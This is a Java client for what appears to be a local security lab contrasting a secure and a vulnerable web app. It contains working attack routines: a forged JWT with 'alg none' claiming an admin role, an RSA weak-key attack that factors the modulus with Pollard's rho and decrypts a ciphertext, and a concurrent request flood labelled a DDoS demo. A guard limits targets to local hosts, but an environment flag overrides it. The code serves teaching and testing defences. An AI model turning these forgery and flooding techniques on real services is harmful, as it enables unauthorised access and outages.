package demo;

import java.math.BigInteger;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.charset.StandardCharsets;
import java.security.SecureRandom;
import java.time.Duration;
import java.time.Instant;
import java.util.ArrayList;
import java.util.Base64;
import java.util.List;
import java.util.Map;
import java.util.UUID;
import java.util.concurrent.Callable;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;

public final class AttackClient {
    private static final HttpClient HTTP = HttpClient.newBuilder().connectTimeout(Duration.ofSeconds(5)).build();
    private static final SecureRandom RANDOM = new SecureRandom();

    public static void main(String[] args) throws Exception {
        String mode = args.length == 0 ? env("ATTACK_MODE", "normal-secure") : args[0];
        switch (mode) {
            case "normal-secure" -> normalSecure();
            case "secure-rejection-demo" -> secureRejectionDemo();
            case "signature-attack" -> signatureAttack();
            case "rsa-weak-key-attack" -> rsaWeakKeyAttack();
            case "ddos-demo" -> ddosDemo();
            default -> throw new IllegalArgumentException("unknown mode: " + mode);
        }
    }

    private static void normalSecure() throws Exception {
        String target = env("TARGET_URL", "http://localhost:8080");
        requireLocalTarget(target);
        log("normal_secure_start", "target", target);
        Response key = get(target + "/secure/public-key");
        log("secure_public_key_seen", "status", key.status, "body", key.body);
        Response encrypted = post(target + "/secure/encrypt", DemoJson.object("plaintext", "call-demo-confidential-message"));
        String ciphertext = DemoJson.parseFlat(encrypted.body).getOrDefault("ciphertext", "");
        log("secure_encrypt_response", "status", encrypted.status, "ciphertextBytes", ciphertext.length());
        Response decrypted = post(target + "/secure/decrypt", DemoJson.object("ciphertext", ciphertext));
        log("secure_decrypt_response", "status", decrypted.status, "body", decrypted.body);
        Response signed = post(target + "/secure/sign", DemoJson.object("payload", "transfer=100&to=alice"));
        String signature = DemoJson.parseFlat(signed.body).getOrDefault("signature", "");
        log("secure_sign_response", "status", signed.status, "signatureBytes", signature.length());
        Response verified = post(target + "/secure/verify", DemoJson.object("payload", "transfer=100&to=alice", "signature", signature));
        log("secure_verify_response", "status", verified.status, "body", verified.body);
        Response token = post(target + "/token/issue", DemoJson.object("sub", "alice", "role", "user"));
        String issuedToken = DemoJson.parseFlat(token.body).getOrDefault("token", "");
        Response tokenVerify = post(target + "/token/verify", DemoJson.object("token", issuedToken));
        log("secure_token_verify_response", "status", tokenVerify.status, "body", tokenVerify.body);
        log("normal_secure_complete", "result", "encryption_signature_token_paths_ok");
    }

    private static void secureRejectionDemo() throws Exception {
        String target = env("TARGET_URL", "http://localhost:8080");
        requireLocalTarget(target);
        log("secure_rejection_demo_start", "target", target);

        Response signed = post(target + "/secure/sign", DemoJson.object("payload", "transfer=100&to=alice"));
        String signature = DemoJson.parseFlat(signed.body).getOrDefault("signature", "");

        Response wrongPayload = post(target + "/secure/verify",
                DemoJson.object("payload", "transfer=9000&to=mallory", "signature", signature));
        log("secure_reject_wrong_payload_signature", "status", wrongPayload.status, "body", wrongPayload.body,
                "expected", "401_invalid_signature");

        Response corruptSignature = post(target + "/secure/verify",
                DemoJson.object("payload", "transfer=100&to=alice", "signature", flipLastBase64Char(signature)));
        log("secure_reject_corrupt_signature", "status", corruptSignature.status, "body", corruptSignature.body,
                "expected", "401_or_400_invalid_signature");

        Response issued = post(target + "/token/issue", DemoJson.object("sub", "alice", "role", "user"));
        String validToken = DemoJson.parseFlat(issued.body).getOrDefault("token", "");

        Response tamperedPayload = post(target + "/token/verify", DemoJson.object("token", tamperTokenPayload(validToken)));
        log("secure_reject_tampered_token_payload", "status", tamperedPayload.status, "body", tamperedPayload.body,
                "expected", "401_signature_mismatch");

        Response algNone = post(target + "/token/verify", DemoJson.object("token", unsignedAdminToken()));
        log("secure_reject_unsigned_alg_none_token", "status", algNone.status, "body", algNone.body,
                "expected", "401_alg_not_allowed");

        Response malformed = post(target + "/token/verify", DemoJson.object("token", "not-a-jwt"));
        log("secure_reject_malformed_token", "status", malformed.status, "body", malformed.body,
                "expected", "400_bad_token_shape");

        log("secure_rejection_demo_complete", "result", "secure_app_rejected_invalid_signature_and_tokens");
    }

    private static void signatureAttack() throws Exception {
        String vulnerable = env("VULNERABLE_URL", "http://localhost:8081");
        String secure = env("SECURE_URL", "http://localhost:8080");
        requireLocalTarget(vulnerable);
        requireLocalTarget(secure);
        String header = b64Url(DemoJson.object("alg", "none", "typ", "JWT").getBytes(StandardCharsets.UTF_8));
        String payload = b64Url(DemoJson.object("sub", "mallory", "role", "admin", "iat", Instant.now().toString()).getBytes(StandardCharsets.UTF_8));
        String forgedToken = header + "." + payload + ".";
        log("signature_attack_start", "attack", "jwt_alg_none", "claim", "role=admin");
        log("signature_attack_vulnerable_result", "status", post(vulnerable + "/token/verify", DemoJson.object("token", forgedToken)).status);
        log("signature_attack_secure_result", "status", post(secure + "/token/verify", DemoJson.object("token", forgedToken)).status);
        log("signature_attack_complete", "expected", "vulnerable_accepts_secure_rejects");
    }

    private static void rsaWeakKeyAttack() throws Exception {
        String vulnerable = env("VULNERABLE_URL", "http://localhost:8081");
        requireLocalTarget(vulnerable);
        Response challenge = get(vulnerable + "/toy/challenge");
        Map<String, String> data = DemoJson.parseFlat(challenge.body);
        BigInteger n = new BigInteger(data.get("n"));
        BigInteger e = new BigInteger(data.get("e"));
        BigInteger c = new BigInteger(data.get("ciphertext"));
        log("rsa_public_material_observed", "nBits", n.bitLength(), "e", e, "ciphertext", c);
        long start = System.nanoTime();
        BigInteger p = pollardRho(n);
        BigInteger q = n.divide(p);
        BigInteger d = e.modInverse(p.subtract(BigInteger.ONE).multiply(q.subtract(BigInteger.ONE)));
        String plaintext = new String(unsignedBytes(c.modPow(d, n)), StandardCharsets.UTF_8);
        log("rsa_weak_key_recovered_plaintext", "p", p, "q", q, "factorMs", elapsedMs(start), "plaintext", plaintext);
    }

    private static void ddosDemo() throws Exception {
        String target = env("TARGET_URL", "http://secure-app:8080");
        requireLocalTarget(target);
        int total = intEnv("TOTAL_REQUESTS", 90);
        int concurrency = intEnv("CONCURRENCY", 6);
        log("availability_load_demo_start", "target", target, "totalRequests", total, "concurrency", concurrency,
                "scope", "local_docker_lab_only");
        String ciphertext = DemoJson.parseFlat(post(target + "/secure/encrypt", DemoJson.object("plaintext", "bounded-load-demo")).body)
                .getOrDefault("ciphertext", "");
        ExecutorService pool = Executors.newFixedThreadPool(concurrency);
        List<Callable<Integer>> tasks = new ArrayList<>();
        long start = System.nanoTime();
        for (int i = 0; i < total; i++) {
            tasks.add(() -> post(target + "/secure/decrypt", DemoJson.object("ciphertext", ciphertext)).status);
        }
        int ok = 0;
        int limited = 0;
        int other = 0;
        for (Future<Integer> future : pool.invokeAll(tasks)) {
            int status = future.get();
            if (status == 200) {
                ok++;
            } else if (status == 429) {
                limited++;
            } else {
                other++;
            }
        }
        pool.shutdown();
        log("availability_load_demo_complete", "status200", ok, "status429", limited,
                "otherStatus", other, "elapsedMs", elapsedMs(start));
    }

    private static Response get(String uri) throws Exception {
        HttpRequest request = HttpRequest.newBuilder(URI.create(uri)).timeout(Duration.ofSeconds(10))
                .header("x-request-id", UUID.randomUUID().toString()).GET().build();
        HttpResponse<String> response = HTTP.send(request, HttpResponse.BodyHandlers.ofString());
        return new Response(response.statusCode(), response.body());
    }

    private static Response post(String uri, String json) throws Exception {
        HttpRequest request = HttpRequest.newBuilder(URI.create(uri)).timeout(Duration.ofSeconds(15))
                .header("content-type", "application/json").header("x-request-id", UUID.randomUUID().toString())
                .POST(HttpRequest.BodyPublishers.ofString(json)).build();
        HttpResponse<String> response = HTTP.send(request, HttpResponse.BodyHandlers.ofString());
        return new Response(response.statusCode(), response.body());
    }

    private static BigInteger pollardRho(BigInteger n) {
        if (n.mod(BigInteger.TWO).equals(BigInteger.ZERO)) {
            return BigInteger.TWO;
        }
        while (true) {
            BigInteger c = new BigInteger(n.bitLength(), RANDOM).mod(n.subtract(BigInteger.ONE)).add(BigInteger.ONE);
            BigInteger x = new BigInteger(n.bitLength(), RANDOM).mod(n.subtract(BigInteger.TWO)).add(BigInteger.TWO);
            BigInteger y = x;
            BigInteger d = BigInteger.ONE;
            while (d.equals(BigInteger.ONE)) {
                x = x.multiply(x).mod(n).add(c).mod(n);
                y = y.multiply(y).mod(n).add(c).mod(n);
                y = y.multiply(y).mod(n).add(c).mod(n);
                d = x.subtract(y).abs().gcd(n);
            }
            if (!d.equals(n)) {
                return d;
            }
        }
    }

    private static void requireLocalTarget(String target) {
        if ("true".equalsIgnoreCase(env("ALLOW_EXTERNAL_TARGETS", "false"))) {
            return;
        }
        String host = URI.create(target).getHost();
        boolean local = "localhost".equals(host) || "127.0.0.1".equals(host) || "::1".equals(host)
                || "secure-app".equals(host) || "vulnerable-app".equals(host);
        if (!local) {
            throw new IllegalArgumentException("Refusing non-local target: " + target);
        }
    }

    private static String b64Url(byte[] bytes) {
        return Base64.getUrlEncoder().withoutPadding().encodeToString(bytes);
    }

    private static String flipLastBase64Char(String value) {
        if (value == null || value.isBlank()) {
            return "AA";
        }
        char last = value.charAt(value.length() - 1);
        char replacement = last == 'A' ? 'B' : 'A';
        return value.substring(0, value.length() - 1) + replacement;
    }

    private static String tamperTokenPayload(String token) {
        String[] parts = token.split("\\.", -1);
        if (parts.length != 3) {
            return token;
        }
        String payload = b64Url(DemoJson.object("sub", "alice", "role", "admin", "iat", Instant.now().toString())
                .getBytes(StandardCharsets.UTF_8));
        return parts[0] + "." + payload + "." + parts[2];
    }

    private static String unsignedAdminToken() {
        String header = b64Url(DemoJson.object("alg", "none", "typ", "JWT").getBytes(StandardCharsets.UTF_8));
        String payload = b64Url(DemoJson.object("sub", "mallory", "role", "admin", "iat", Instant.now().toString())
                .getBytes(StandardCharsets.UTF_8));
        return header + "." + payload + ".";
    }

    private static byte[] unsignedBytes(BigInteger value) {
        byte[] bytes = value.toByteArray();
        if (bytes.length > 1 && bytes[0] == 0) {
            byte[] trimmed = new byte[bytes.length - 1];
            System.arraycopy(bytes, 1, trimmed, 0, trimmed.length);
            return trimmed;
        }
        return bytes;
    }

    private static void log(String event, Object... pairs) {
        DemoLog.log(event, pairs);
    }

    private static String env(String key, String defaultValue) {
        String value = System.getenv(key);
        return value == null || value.isBlank() ? defaultValue : value;
    }

    private static int intEnv(String key, int defaultValue) {
        try {
            return Integer.parseInt(env(key, String.valueOf(defaultValue)));
        } catch (NumberFormatException e) {
            return defaultValue;
        }
    }

    private static long elapsedMs(long startNanos) {
        return (System.nanoTime() - startNanos) / 1_000_000;
    }

    private record Response(int status, String body) {
    }
}
